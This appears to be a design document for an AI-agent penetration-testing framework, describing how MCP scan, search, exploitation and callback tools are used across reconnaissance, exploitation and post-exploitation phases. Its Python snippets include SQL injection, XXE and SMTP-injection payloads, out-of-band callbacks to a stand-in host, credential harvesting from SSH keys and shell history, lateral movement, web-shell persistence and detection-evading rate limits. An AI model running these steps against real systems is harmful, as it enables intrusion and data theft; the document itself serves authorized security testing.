# MCP Tool Integration Patterns

MCP (Model Context Protocol) servers provide specialized tools for penetration testing workflows. This document describes how to integrate MCP tools into the phased testing lifecycle.

## Overview

**MCP Tools Available**:
- **Scan Tool**: Endpoint discovery, form identification, parameter extraction
- **Search Tool**: Sensitive files, configuration exposure, debug endpoints
- **Data Retrieval Tool**: Public data access, API documentation, error messages
- **Code Analysis Tool**: Client-side code review, dependency analysis, security issues
- **Exploitation Tool**: Payload delivery, exploit execution

**Supporting Services**:
- **Callback Services**: Validate exploitation success (HTTP, DNS, SMTP callbacks)
- **Target Services**: Systems under test

## Phase-Specific Tool Usage

### Phase 2: Initial Reconnaissance

**MCP Tools**: Scan, Search, Data Retrieval, Code Analysis

**Scan Tool Pattern**:
```python
# Endpoint Discovery
scan_results = scan_tool.discover_endpoints(
    target="https://example.com",
    depth=3,  # Crawl depth
    include_forms=True,
    include_parameters=True
)

# Output: List of discovered endpoints with metadata
endpoints = [
    {
        "url": "https://example.com/search",
        "method": "GET",
        "parameters": ["q", "category", "sort"],
        "forms": [...],
        "status": 200,
        "technologies": ["React", "Express"]
    },
    ...
]
```

**Search Tool Pattern**:
```python
# Sensitive File Discovery
search_results = search_tool.find_files(
    target="https://example.com",
    patterns=[
        "*.env",           # Environment files
        "*.config",        # Configuration files
        "/admin/*",        # Admin endpoints
        "/debug/*",        # Debug endpoints
        "/.git/*",         # Git exposure
        "/backup/*",       # Backup files
        "/api/docs/*",     # API documentation
    ]
)

# Output: Discovered sensitive files
sensitive_files = [
    {
        "path": "/backup/database.sql",
        "size": 1024000,
        "exposed": True,
        "risk": "High"
    },
    ...
]
```

**Data Retrieval Tool Pattern**:
```python
# Public Data Access
data = data_retrieval_tool.fetch(
    urls=[
        "https://example.com/robots.txt",
        "https://example.com/sitemap.xml",
        "https://example.com/api/docs",
        "https://example.com/.well-known/security.txt"
    ],
    capture_errors=True  # Capture error messages for analysis
)

# Output: Retrieved data with analysis
retrieved_data = [
    {
        "url": "https://example.com/api/docs",
        "content": "...",
        "metadata": {
            "api_endpoints": [...],
            "authentication": "JWT",
            "rate_limiting": False
        }
    },
    ...
]
```

**Code Analysis Tool Pattern**:
```python
# Client-Side Code Review
analysis = code_analysis_tool.analyze(
    target="https://example.com",
    analyze_javascript=True,
    analyze_html=True,
    check_dependencies=True
)

# Output: Security issues identified
security_issues = [
    {
        "file": "app.min.js",
        "issue": "Hardcoded API key",
        "severity": "High",
        "line": 1247,
        "details": "API key exposed in client-side code"
    },
    {
        "dependency": "jquery@2.1.4",
        "issue": "Known CVE",
        "severity": "Medium",
        "cve": "CVE-2019-11358"
    },
    ...
]
```

**Phase 2 Integration Example**:
```python
# Comprehensive Reconnaissance
def phase_2_reconnaissance(target):
    # Step 1: Endpoint discovery
    endpoints = scan_tool.discover_endpoints(target, depth=3)

    # Step 2: Sensitive file search
    sensitive_files = search_tool.find_files(target, sensitive_patterns)

    # Step 3: Public data retrieval
    public_data = data_retrieval_tool.fetch([
        f"{target}/robots.txt",
        f"{target}/sitemap.xml",
        f"{target}/api/docs"
    ])

    # Step 4: Client-side code analysis
    code_issues = code_analysis_tool.analyze(target)

    # Step 5: Build attack surface inventory
    inventory = {
        "endpoints": endpoints,
        "sensitive_files": sensitive_files,
        "public_data": public_data,
        "code_issues": code_issues,
        "technology_stack": extract_technologies(endpoints, code_issues),
        "potential_vulnerabilities": generate_test_checklist(endpoints, code_issues)
    }

    # Step 6: Generate phase-2 report
    generate_report("phase-2-reconnaissance-summary.md", inventory)

    return inventory
```

### Phase 3: Iterative Vulnerability Scanning

**MCP Tools**: Scan, Search, Exploitation Tool + Callback Services

**Exploitation Tool Pattern**:
```python
# Payload Delivery
exploit_result = exploitation_tool.test(
    target="https://example.com/search?q={payload}",
    vulnerability_type="SQL Injection",
    payloads=[
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'; WAITFOR DELAY '00:00:05'--"
    ],
    callback_url="http://callback.example.com/sqli"
)

# Output: Exploitation results with callback validation
results = [
    {
        "payload": "' UNION SELECT NULL--",
        "response_code": 200,
        "response_body": "...",
        "vulnerability_confirmed": True,
        "callback_received": True,
        "callback_data": "Database version: PostgreSQL 13.2",
        "exploitation_time": "2025-01-15T14:23:45Z"
    },
    ...
]
```

**Callback Service Integration**:
```python
# Setup callback listener
callback_service = CallbackService(
    http_endpoint="http://callback.example.com",
    dns_domain="callback.example.com",
    smtp_address="callback@example.com"
)

# Register callback for specific test
callback_id = callback_service.register(
    test_id="SQLi-001",
    vulnerability_type="SQL Injection",
    target="https://example.com/search",
    timeout=60  # Wait 60 seconds for callback
)

# Test with callback validation
exploitation_tool.test(
    target=f"https://example.com/search?q=' UNION SELECT '{callback_id}'--",
    callback_url=f"http://callback.example.com/{callback_id}"
)

# Wait for callback
callback_received = callback_service.wait_for_callback(
    callback_id=callback_id,
    timeout=60
)

if callback_received:
    print("[+] Vulnerability confirmed via callback")
    callback_data = callback_service.get_data(callback_id)
    print(f"[+] Data received: {callback_data}")
else:
    print("[-] No callback received - vulnerability not confirmed")
```

**Phase 3 Integration Example**:
```python
# Iterative Vulnerability Testing with Callbacks
def phase_3_vulnerability_testing(target, endpoints):
    # Setup callback service
    callback_service = CallbackService()

    findings = []

    # Deploy specialized agents (this is orchestrator's job)
    # Each agent follows this pattern:

    for endpoint in endpoints:
        # Step 1: Hypothesis generation
        hypotheses = generate_hypotheses(endpoint)

        # Step 2: Experimentation (test each hypothesis)
        for hypothesis in hypotheses:
            # Register callback for this test
            callback_id = callback_service.register(
                test_id=f"{hypothesis.type}-{endpoint.id}",
                vulnerability_type=hypothesis.type,
                target=endpoint.url
            )

            # Step 3: Exploitation attempt
            result = exploitation_tool.test(
                target=endpoint.url,
                vulnerability_type=hypothesis.type,
                payloads=hypothesis.payloads,
                callback_url=f"http://callback.example.com/{callback_id}"
            )

            # Step 4: Callback validation
            if callback_service.wait_for_callback(callback_id, timeout=60):
                # Vulnerability confirmed!
                callback_data = callback_service.get_data(callback_id)

                # Step 5: Develop verified PoC
                poc = develop_poc(
                    vulnerability=hypothesis.type,
                    target=endpoint.url,
                    payload=result.successful_payload,
                    callback_data=callback_data
                )

                # Step 6: Test PoC and capture output
                poc_output = test_poc(poc)

                # Step 7: Create finding
                finding = create_finding(
                    vulnerability=hypothesis.type,
                    target=endpoint.url,
                    poc=poc,
                    poc_output=poc_output,
                    callback_validation=callback_data
                )

                findings.append(finding)

    return findings
```

**Scan Tool (Continued Discovery)**:
```python
# During Phase 3, continue discovering new endpoints
# Especially important after gaining access or discovering new functionality

def continuous_discovery(target, authenticated_session=None):
    # Discover endpoints accessible only after authentication
    if authenticated_session:
        endpoints = scan_tool.discover_endpoints(
            target=target,
            session=authenticated_session,  # Use authenticated session
            depth=5  # Deeper crawl with auth
        )
    else:
        endpoints = scan_tool.discover_endpoints(target, depth=3)

    return endpoints
```

### Phase 4-5: Internal Reconnaissance & Post-Exploitation

**MCP Tools**: Scan, Search, Data Retrieval, Code Analysis, Exploitation Tool

**Scan Tool (Internal Network)**:
```python
# Internal Network Scanning
# Executed from compromised system via Phase 3 exploit

internal_scan = scan_tool.scan_network(
    network="10.0.0.0/8",
    ports=[22, 80, 443, 3306, 5432, 6379, 27017],  # Common services
    from_host="10.0.1.50",  # Compromised web server
    timeout=300  # 5 minutes
)

# Output: Internal network map
internal_hosts = [
    {
        "ip": "10.0.2.10",
        "hostname": "app-db-01",
        "open_ports": [3306],
        "services": ["MySQL 8.0"],
        "os": "Ubuntu 20.04"
    },
    {
        "ip": "10.0.2.20",
        "hostname": "redis-cache",
        "open_ports": [6379],
        "services": ["Redis 6.2"],
        "os": "Ubuntu 20.04"
    },
    ...
]
```

**Search Tool (Credential Harvesting)**:
```python
# Credential Harvesting from Compromised System
credentials = search_tool.find_credentials(
    host="10.0.1.50",  # Compromised web server
    search_locations=[
        "/var/www/",           # Web root
        "/etc/",               # Configuration files
        "/home/*/.ssh/",       # SSH keys
        "/home/*/.bash_history",  # Command history
        "/tmp/",               # Temporary files
        "/opt/app/config/",    # Application configs
    ],
    credential_types=[
        "database_credentials",
        "api_keys",
        "ssh_keys",
        "passwords",
        "tokens"
    ]
)

# Output: Harvested credentials
harvested_creds = [
    {
        "type": "database_credentials",
        "location": "/var/www/.env",
        "username": "db_admin",
        "password": "P@ssw0rd123",
        "service": "MySQL",
        "host": "10.0.2.10"
    },
    {
        "type": "ssh_key",
        "location": "/home/deploy/.ssh/id_rsa",
        "user": "deploy",
        "fingerprint": "SHA256:...",
        "passphrase_protected": False
    },
    ...
]
```

**Data Retrieval Tool (Sensitive Data Discovery)**:
```python
# Sensitive Data Discovery
sensitive_data = data_retrieval_tool.discover_data(
    host="10.0.2.10",  # Database server
    credentials=harvested_creds["db_admin"],
    data_types=[
        "PII",              # Personal Identifiable Information
        "payment_data",     # Credit cards, financial data
        "credentials",      # User credentials
        "intellectual_property",  # Trade secrets, source code
        "confidential"      # Business confidential data
    ]
)

# Output: Sensitive data inventory
data_inventory = [
    {
        "location": "production_db.users",
        "data_type": "PII",
        "records": 100000,
        "fields": ["email", "full_name", "address", "phone"],
        "sensitivity": "High",
        "compliance": ["GDPR", "CCPA"]
    },
    {
        "location": "production_db.payments",
        "data_type": "payment_data",
        "records": 50000,
        "fields": ["card_number", "cvv", "expiry"],
        "sensitivity": "Critical",
        "compliance": ["PCI-DSS"]
    },
    ...
]
```

**Code Analysis Tool (Internal Application Review)**:
```python
# Internal Application Security Review
internal_analysis = code_analysis_tool.analyze_internal(
    host="10.0.1.50",
    application_paths=[
        "/var/www/html/",
        "/opt/app/",
        "/usr/local/bin/"
    ],
    analyze_configs=True,
    check_secrets=True
)

# Output: Internal security issues
internal_issues = [
    {
        "file": "/opt/app/config/database.yml",
        "issue": "Plaintext database credentials",
        "severity": "High",
        "credentials": {
            "username": "root",
            "password": "Passw0rd123"
        }
    },
    {
        "file": "/usr/local/bin/backup.sh",
        "issue": "Sudo misconfiguration exploit",
        "severity": "Critical",
        "details": "Script can be run as root via sudo"
    },
    ...
]
```

**Exploitation Tool (Lateral Movement)**:
```python
# Lateral Movement Testing
lateral_movement = exploitation_tool.test_lateral_movement(
    from_host="10.0.1.50",  # Compromised web server
    credentials=harvested_creds,
    target_hosts=internal_hosts
)

# Output: Successful pivots
pivots = [
    {
        "from": "10.0.1.50",
        "to": "10.0.2.10",
        "method": "Credential reuse",
        "credentials": "db_admin / P@ssw0rd123",
        "access": "MySQL root shell",
        "timestamp": "2025-01-15T15:30:00Z"
    },
    {
        "from": "10.0.2.10",
        "to": "10.0.3.15",
        "method": "SSH key reuse",
        "credentials": "deploy SSH key",
        "access": "Shell access",
        "timestamp": "2025-01-15T15:35:00Z"
    },
    ...
]
```

**Phase 4-5 Integration Example**:
```python
# Post-Exploitation Workflow
def phase_4_5_post_exploitation(compromised_host, initial_access):
    results = {
        "internal_network": [],
        "credentials": [],
        "sensitive_data": [],
        "pivots": [],
        "privilege_escalation": None
    }

    # PHASE 4: Internal Reconnaissance

    # Step 1: Internal network scanning
    results["internal_network"] = scan_tool.scan_network(
        network=detect_network(compromised_host),
        from_host=compromised_host
    )

    # Step 2: Credential harvesting
    results["credentials"] = search_tool.find_credentials(
        host=compromised_host,
        search_locations=common_locations
    )

    # Step 3: Sensitive data discovery
    for cred in results["credentials"]:
        if cred["type"] == "database_credentials":
            data = data_retrieval_tool.discover_data(
                host=cred["host"],
                credentials=cred
            )
            results["sensitive_data"].extend(data)

    # Step 4: Internal application review
    internal_issues = code_analysis_tool.analyze_internal(
        host=compromised_host,
        application_paths=common_app_paths
    )

    # PHASE 5: Privilege Escalation & Lateral Movement

    # Step 5: Test privilege escalation
    results["privilege_escalation"] = exploitation_tool.test_privesc(
        host=compromised_host,
        current_user=initial_access["user"],
        techniques=["sudo", "suid", "kernel_exploit", "cron"]
    )

    # Step 6: Test lateral movement
    results["pivots"] = exploitation_tool.test_lateral_movement(
        from_host=compromised_host,
        credentials=results["credentials"],
        target_hosts=results["internal_network"]
    )

    # Step 7: Data exfiltration testing (SIMULATED ONLY)
    exfil_test = exploitation_tool.test_exfiltration(
        data=generate_dummy_data(),  # NOT real sensitive data
        methods=["http", "dns", "smtp"],
        callback_service=callback_service
    )

    # Step 8: Persistence testing
    persistence_test = exploitation_tool.test_persistence(
        host=compromised_host,
        mechanisms=["ssh_key", "cron", "web_shell"]
    )

    # CRITICAL: Remove all persistence mechanisms
    exploitation_tool.cleanup_persistence(
        host=compromised_host,
        mechanisms=persistence_test["deployed"]
    )

    return results
```

## Callback Service Patterns

### HTTP Callback

```python
# Setup HTTP callback listener
callback_service.setup_http(
    endpoint="http://callback.example.com",
    port=80
)

# Register callback expectation
callback_id = callback_service.register(
    test_id="SSRF-001",
    callback_type="http",
    expected_data_pattern=".*metadata.*"  # Expecting AWS metadata
)

# Test SSRF with callback
exploitation_tool.test(
    target="https://example.com/fetch?url=http://callback.example.com/{callback_id}",
    vulnerability_type="SSRF"
)

# Validate callback
if callback_service.wait_for_callback(callback_id, timeout=30):
    data = callback_service.get_data(callback_id)
    print(f"[+] SSRF confirmed. Data: {data}")
```

### DNS Callback

```python
# Setup DNS callback listener
callback_service.setup_dns(
    domain="callback.example.com"
)

# Register callback expectation
callback_id = callback_service.register(
    test_id="XXE-001",
    callback_type="dns",
    subdomain=f"{callback_id}.callback.example.com"
)

# Test XXE with DNS exfiltration
exploitation_tool.test(
    target="https://example.com/upload",
    vulnerability_type="XXE",
    payload=f"""
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "http://{callback_id}.callback.example.com/xxe">
    ]>
    <foo>&xxe;</foo>
    """
)

# Validate DNS callback
if callback_service.wait_for_callback(callback_id, timeout=30):
    print("[+] XXE confirmed via DNS callback")
```

### SMTP Callback

```python
# Setup SMTP callback listener
callback_service.setup_smtp(
    address="callback@example.com"
)

# Register callback expectation
callback_id = callback_service.register(
    test_id="SMTP-Injection-001",
    callback_type="smtp"
)

# Test email header injection
exploitation_tool.test(
    target="https://example.com/contact",
    vulnerability_type="SMTP Injection",
    payload=f"test@example.com\nBCC: callback+{callback_id}@example.com"
)

# Validate SMTP callback
if callback_service.wait_for_callback(callback_id, timeout=60):
    print("[+] SMTP injection confirmed via email callback")
```

## Target Service Tracking

```python
# Track target services being tested
target_service_tracker = TargetServiceTracker()

# Register services discovered in Phase 2
target_service_tracker.register_services([
    {
        "name": "Web Application",
        "url": "https://example.com",
        "technologies": ["React", "Node.js", "Express"],
        "endpoints": 127
    },
    {
        "name": "REST API",
        "url": "https://api.example.com",
        "technologies": ["Express", "JWT"],
        "endpoints": 43
    },
    {
        "name": "GraphQL API",
        "url": "https://example.com/graphql",
        "technologies": ["Apollo Server"],
        "endpoints": 1
    }
])

# Track testing progress
target_service_tracker.update_progress(
    service="Web Application",
    endpoints_tested=127,
    vulnerabilities_found=18,
    status="Complete"
)

# Generate service testing summary
summary = target_service_tracker.generate_summary()
```

## Best Practices

### Error Handling

```python
try:
    endpoints = scan_tool.discover_endpoints(target, depth=3)
except ScanToolError as e:
    # Handle scan errors gracefully
    log_error(f"Scan failed: {e}")
    # Fall back to manual endpoint list
    endpoints = load_manual_endpoints()
```

### Rate Limiting

```python
# Respect rate limits to avoid detection/blocking
scan_tool.configure(
    rate_limit=10,  # 10 requests per second
    delay=0.1,      # 100ms delay between requests
    randomize_delay=True  # Randomize delay (50-150ms)
)
```

### Authentication

```python
# Test with authenticated session
authenticated_session = exploitation_tool.authenticate(
    target="https://example.com/login",
    credentials={"username": "test", "password": "test123"}
)

# Use authenticated session for testing
endpoints = scan_tool.discover_endpoints(
    target="https://example.com",
    session=authenticated_session
)
```

### Cleanup

```python
# Always cleanup after testing
def cleanup_after_testing(compromised_hosts, persistence_mechanisms):
    for host in compromised_hosts:
        # Remove persistence mechanisms
        exploitation_tool.remove_persistence(host, persistence_mechanisms)

        # Clear logs (if authorized)
        exploitation_tool.clear_testing_artifacts(host)

        # Verify cleanup
        verify_cleanup(host)
```

## Integration Checklist

```
MCP Tool Integration:
- [ ] Phase 2: Scan + Search + Data Retrieval + Code Analysis
- [ ] Phase 3: Exploitation Tool + Callback Services
- [ ] Phase 4-5: All tools for internal recon + post-exploitation
- [ ] Callback validation for all exploitation attempts
- [ ] Target service tracking throughout engagement
- [ ] Rate limiting configured appropriately
- [ ] Authentication sessions managed correctly
- [ ] Error handling for all tool operations
- [ ] Cleanup performed after testing
- [ ] Tool usage documented in intermediate reports
```

---

**Key Principle**: MCP tools provide the foundation for AI-driven testing. The orchestrator (Pentester agent) coordinates tool usage across phases, while specialized agents use tools for specific vulnerability testing. Callback services validate exploitation success, making the difference between theoretical and confirmed vulnerabilities.
